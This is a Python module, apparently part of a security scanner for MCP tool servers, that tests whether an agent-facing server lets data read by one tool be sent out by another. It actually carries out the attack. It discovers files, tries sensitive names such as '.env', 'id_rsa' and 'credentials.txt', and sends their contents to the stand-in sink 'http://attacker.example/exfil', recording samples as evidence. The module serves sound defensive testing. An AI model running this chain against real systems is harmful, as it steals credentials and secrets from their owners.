"""Tool-chaining exfiltration attack.

Demonstrates data exfiltration by *chaining* two of the target's own tools:
read sensitive data with one tool (e.g. `read_file`) and push it straight out
through another tool that sends data off-box (e.g. `send_notification`). A
server with no data-flow / egress control between its tools is vulnerable — the
individual tools may each look benign, but nothing stops an agent from wiring
the read output into the send input.

This module only performs *dynamic* testing: it actually invokes the tools on a
live target and checks whether real data moved from a read tool into a send
tool. No static description matching decides the verdict — a chain is only
reported when the send call succeeds and carried data that came from the read.
"""

from __future__ import annotations

import json
from typing import Any

from ..client import MCPClient, TargetConfig
from ..reporting import Finding, Outcome, Severity

ATTACK_ID = "tool_chain_exfil"
CATEGORY = "tool-chaining-exfiltration"

# Attacker-controlled sentinel used as the exfiltration destination. Nothing
# real is contacted for the lab target (its send tool only logs locally), but
# using a distinctive value makes the intent obvious in evidence.
ATTACKER_SINK = "http://attacker.example/exfil"

# Keyword heuristics for classifying tools by role.
_READ_HINTS = ("read", "get", "list", "file", "fetch", "load", "cat", "show",
               "view", "download", "dump", "open")
_SEND_HINTS = ("send", "notify", "post", "webhook", "email", "mail", "publish",
               "upload", "export", "http", "request", "submit", "deliver")

# Which input parameter of a send tool most likely carries the message body.
_CONTENT_PARAM_HINTS = ("message", "content", "body", "text", "data", "payload",
                        "msg", "note")
# Which input parameter names a send tool's outbound destination.
_DEST_PARAM_HINTS = ("url", "webhook", "endpoint", "recipient", "email", "dest",
                     "address", "channel", "to", "target")
# Which input parameter of a read tool names the thing to read.
_TARGET_PARAM_HINTS = ("path", "file", "filename", "name", "key", "id",
                       "directory", "dir", "resource")

# Files worth trying when a list tool discovers nothing (or in addition to it).
_FALLBACK_FILENAMES = ("credentials.txt", ".env", ".env.local", "config.json",
                       "secrets.json", "id_rsa", "password.txt")
# Filename fragments that suggest sensitive data, used to try the juiciest
# discovered files first.
_SENSITIVE_HINTS = ("credential", "secret", ".env", "password", "passwd",
                    "token", "key", "config", "api", "private", "id_rsa")

_SAMPLE_LEN = 200


def _text(*parts: str | None) -> str:
    return " ".join(p for p in parts if p).lower()


def _is_read_tool(tool: Any) -> bool:
    return any(h in _text(tool.name, tool.description) for h in _READ_HINTS)


def _is_send_tool(tool: Any) -> bool:
    return any(h in _text(tool.name, tool.description) for h in _SEND_HINTS)


def _properties(tool: Any) -> dict[str, Any]:
    return (tool.inputSchema or {}).get("properties") or {}


def _required(tool: Any) -> list[str]:
    return list((tool.inputSchema or {}).get("required") or [])


def _pick_param(tool: Any, hints: tuple[str, ...]) -> str | None:
    """First property whose name matches one of `hints`, else None."""
    for name in _properties(tool):
        low = name.lower()
        if any(h in low for h in hints):
            return name
    return None


def _first_string_param(tool: Any, *, exclude: set[str] = frozenset()) -> str | None:
    for name, spec in _properties(tool).items():
        if name in exclude:
            continue
        if (spec or {}).get("type", "string") == "string":
            return name
    return None


def _placeholder_for(spec: dict[str, Any]) -> Any:
    kind = (spec or {}).get("type", "string")
    return {"integer": 0, "number": 0, "boolean": False,
            "array": [], "object": {}}.get(kind, "scanner-test")


def _extract_text(result: Any) -> str:
    """Flatten a CallToolResult's content blocks into a single string."""
    parts: list[str] = []
    for block in getattr(result, "content", None) or []:
        text = getattr(block, "text", None)
        if text:
            parts.append(text)
    if parts:
        return "\n".join(parts)
    structured = getattr(result, "structuredContent", None)
    if structured is not None:
        return json.dumps(structured)
    return ""


def _extract_names(result: Any) -> list[str]:
    """Pull a list of entry names out of a list-tool result."""
    structured = getattr(result, "structuredContent", None)
    if isinstance(structured, dict):
        value = structured.get("result", structured)
        if isinstance(value, list):
            return [str(v) for v in value]
    names: list[str] = []
    for block in getattr(result, "content", None) or []:
        text = getattr(block, "text", None)
        if text:
            names.extend(line.strip() for line in text.splitlines() if line.strip())
    return names


def _sensitivity(name: str) -> int:
    low = name.lower()
    return sum(1 for h in _SENSITIVE_HINTS if h in low)


async def _discover_filenames(client: MCPClient, tools: list[Any]) -> list[str]:
    """Ask any list-type tool for filenames, most-sensitive first, then fall
    back to a fixed set of common sensitive filenames."""
    discovered: list[str] = []
    for tool in tools:
        if "list" not in _text(tool.name, tool.description):
            continue
        # Fill any required params with placeholders so the call goes through.
        args = {name: _placeholder_for(_properties(tool)[name])
                for name in _required(tool)}
        try:
            result = await client.call_tool(tool.name, args)
        except Exception:
            continue
        if not getattr(result, "isError", False):
            discovered.extend(_extract_names(result))

    ordered = sorted(set(discovered), key=lambda n: (-_sensitivity(n), n))
    # Discovered files (sensitive first), then fixed fallbacks, de-duplicated.
    candidates: list[str] = []
    for name in [*ordered, *_FALLBACK_FILENAMES]:
        if name not in candidates:
            candidates.append(name)
    return candidates


def _read_args(read_tool: Any, target_param: str, filename: str) -> dict[str, Any]:
    args: dict[str, Any] = {target_param: filename}
    for name in _required(read_tool):
        if name != target_param and name not in args:
            args[name] = _placeholder_for(_properties(read_tool)[name])
    return args


def _send_args(send_tool: Any, content_param: str, payload: str) -> dict[str, Any]:
    args: dict[str, Any] = {content_param: payload}
    dest_param = _pick_param(send_tool, _DEST_PARAM_HINTS)
    for name in _required(send_tool):
        if name in args:
            continue
        if name == dest_param:
            args[name] = ATTACKER_SINK
        else:
            args[name] = _placeholder_for(_properties(send_tool)[name])
    if dest_param and dest_param not in args:
        args[dest_param] = ATTACKER_SINK
    return args


async def _read_something(client: MCPClient, read_tool: Any, target_param: str,
                          candidates: list[str],
                          cache: dict[str, tuple[str, str]]) -> tuple[str, str] | None:
    """Return (filename, content) for the first candidate this read tool can
    read as non-empty data, or None. Results are cached per read tool."""
    if read_tool.name in cache:
        return cache[read_tool.name]
    for filename in candidates:
        try:
            result = await client.call_tool(
                read_tool.name, _read_args(read_tool, target_param, filename))
        except Exception:
            continue
        if getattr(result, "isError", False):
            continue
        content = _extract_text(result).strip()
        if content:
            cache[read_tool.name] = (filename, content)
            return cache[read_tool.name]
    return None


async def _run_connected(client: MCPClient) -> list[Finding]:
    tools = await client.list_tools()
    read_tools = [t for t in tools if _is_read_tool(t)]
    send_tools = [t for t in tools if _is_send_tool(t)]
    if not read_tools or not send_tools:
        return []

    candidates = await _discover_filenames(client, tools)
    read_cache: dict[str, tuple[str, str]] = {}
    findings: list[Finding] = []

    for send_tool in send_tools:
        content_param = (_pick_param(send_tool, _CONTENT_PARAM_HINTS)
                         or _first_string_param(
                             send_tool,
                             exclude={_pick_param(send_tool, _DEST_PARAM_HINTS) or ""}))
        if not content_param:
            continue

        for read_tool in read_tools:
            if read_tool.name == send_tool.name:
                continue
            target_param = (_pick_param(read_tool, _TARGET_PARAM_HINTS)
                            or _first_string_param(read_tool))
            if not target_param:
                continue

            read = await _read_something(client, read_tool, target_param,
                                         candidates, read_cache)
            if read is None:
                continue
            filename, content = read

            send_args = _send_args(send_tool, content_param, content)
            try:
                send_result = await client.call_tool(send_tool.name, send_args)
            except Exception:
                continue
            if getattr(send_result, "isError", False):
                continue

            # Confirm real data crossed the boundary: the value we handed the
            # send tool is exactly the read tool's (non-empty) output.
            moved = send_args[content_param]
            if not moved or moved not in content:
                continue

            findings.append(_make_finding(read_tool, send_tool, filename,
                                           target_param, content_param,
                                           content, send_result))
    return findings


def _make_finding(read_tool: Any, send_tool: Any, filename: str,
                  target_param: str, content_param: str, content: str,
                  send_result: Any) -> Finding:
    sample = content[:_SAMPLE_LEN] + ("…" if len(content) > _SAMPLE_LEN else "")
    return Finding(
        attack_id=ATTACK_ID,
        category=CATEGORY,
        title=f"Data exfiltration via {read_tool.name} → {send_tool.name}",
        outcome=Outcome.VULNERABLE,
        severity=Severity.HIGH,
        description=(
            f"Chained {read_tool.name!r} (read) into {send_tool.name!r} (send) "
            f"with no egress control in between: data read from "
            f"{filename!r} was accepted by {send_tool.name!r} and sent to an "
            f"attacker-controlled destination."),
        evidence={
            "read_tool": read_tool.name,
            "read_call": f"{read_tool.name}({target_param}={filename!r})",
            "send_tool": send_tool.name,
            "send_call": f"{send_tool.name}({content_param}=<read output>, "
                         f"→ {ATTACKER_SINK})",
            "content_param": content_param,
            "bytes_moved": len(content),
            "data_sample": sample,
            "send_response": _extract_text(send_result)[:_SAMPLE_LEN],
        },
    )


async def run(config: TargetConfig) -> list[Finding]:
    """Connect to the target and attempt tool-chaining exfiltration.

    Returns a list of `Finding`s (one per vulnerable read→send chain found);
    an empty list means no chain fired.
    """
    client = MCPClient(config)
    async with client.connect():
        return await _run_connected(client)
